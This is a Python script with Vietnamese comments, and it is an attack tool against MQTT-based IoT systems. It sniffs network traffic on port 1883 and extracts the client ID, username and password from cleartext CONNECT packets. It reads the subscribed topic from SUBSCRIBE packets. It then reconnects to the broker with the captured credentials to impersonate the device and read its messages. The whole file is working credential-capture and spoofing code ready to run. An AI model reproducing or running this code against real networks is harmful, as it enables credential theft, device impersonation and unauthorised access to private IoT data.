import sys
from scapy.all import *
import re
import paho.mqtt.client as mqtt
import json

# Thiết lập cấu hình để sử dụng Npcap
conf.use_pcap = True
conf.use_npcap = True

# Tạo một client MQTT với tên "Subscriber"
# Hàm để giải mã dữ liệu raw của gói tin MQTT

def process_json_input(json_string):
    try:
        # Phân tích chuỗi JSON thành một đối tượng Python
        data = json.loads(json_string)
        # Trả về đối tượng đã được phân tích
        return data
    except json.JSONDecodeError as e:
        # Xử lý trường hợp nếu chuỗi JSON không hợp lệ
        print("Invalid JSON format:", e)
        sys.stdout.flush()
        return None

def All(ip, port, interface):
    def filter_mqtt(pkt):
        if pkt.haslayer(Raw):
            raw_data = pkt[Raw].load
            return raw_data.startswith(b'\x10') or raw_data.startswith(b'\x82')
        return False

    def extract_alphanumeric(input_string):
        # Sử dụng biểu thức chính quy để chỉ lấy các ký tự abc và số
        alphanumeric_only = re.sub(r'[^a-zA-Z0-9]', '', input_string)
        return alphanumeric_only

    temp_info = {}
    temp_info1 = {}

    def decode_mqtt_raw(pkt):
        if pkt.haslayer(Raw):
            raw_data = pkt[Raw].load
            print("Raw data:", raw_data)
            try:
                if raw_data.startswith(b'\x10'):
                    payload = raw_data[12:]
                    payload_ascii = payload.decode('utf-8')
                    values = payload_ascii.split('\x00')
                    if len(values) > 3:
                        Client_Id = extract_alphanumeric(values[1])
                        Username = extract_alphanumeric(values[2])
                        Password = extract_alphanumeric(values[3])
                        temp_info['Username'] = Username
                        temp_info['Password'] = Password
                        temp_info['Client_Id'] = Client_Id
                        print("Listening, Username, Password:", Client_Id, Username, Password)
                        sys.stdout.flush()
                    else:
                        print("Error: Not enough elements in values")
                        sys.stdout.flush()
                    # Client_Id=extract_alphanumeric(values[1])
                    # Username = extract_alphanumeric(values[2])
                    # Password = extract_alphanumeric(values[3])
                    # temp_info['Username'] = Username
                    # temp_info['Password'] = Password
                    # temp_info['Client_Id']=Client_Id
                    # print("Listening, Username,Password ",Client_Id,Username, Password)
                    # sys.stdout.flush()

                if raw_data.startswith(b'\x82'):
                    raw_data_new = raw_data[:-1]
                    payload = raw_data_new[6:]
                    payload_ascii = payload.decode('utf-8')
                    Topic = payload_ascii
                    print("Listening Topic:", Topic)
                    sys.stdout.flush()
                    temp_info1['Topic'] = Topic

            except UnicodeDecodeError:
                print("Error")
                sys.stdout.flush()

    # Bắt và lọc những gói tin MQTT Connect Command và Subscribe Request
    sniff(iface=interface, filter="tcp port 1883",
          prn=decode_mqtt_raw, lfilter=filter_mqtt, count=2)

    def spoofingIOT(Client_Id,Username, Password, Topic):
        client = mqtt.Client(Client_Id)
        # Hàm giả mạo thiết bị IOT tại đây

        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe(Topic)  # Đăng ký (subscribe) vào chủ đề "lolotica" khi kết nối thành công
            else:
                print("Connection failed")
                sys.stdout.flush()

        def on_message(client, userdata, message):
        
            print("Spoofing Received message:", message.payload.decode())
            sys.stdout.flush()
            # if message.payload:
            #     print("Data received. Stopping the program.")
            #     sys.stdout.flush()
            #     client.disconnect()  # Ngắt kết nối khi có dữ liệu
            #     exit()  # Kết thúc chương trình

        client.on_connect = on_connect
        client.on_message = on_message
        client.username_pw_set(Username, Password)  # Thiết lập thông tin đăng nhập
        client.connect(ip, port)  # Kết nối tới broker MQTT
        client.loop_forever()

    if(temp_info1.get('Topic') and temp_info.get('Username') and temp_info.get('Password') and temp_info.get('Client_Id')):
        spoofingIOT(temp_info['Client_Id'],temp_info['Username'],
                    temp_info['Password'], temp_info1['Topic'])


if __name__ == "__main__":
    data1 = sys.stdin.readline()
    data=process_json_input(data1)
    print("Loading spoofing device IOT ....................")
    print(data)
    sys.stdout.flush()
    All(data["ipserver"], int(data["port"]), data["interface"])
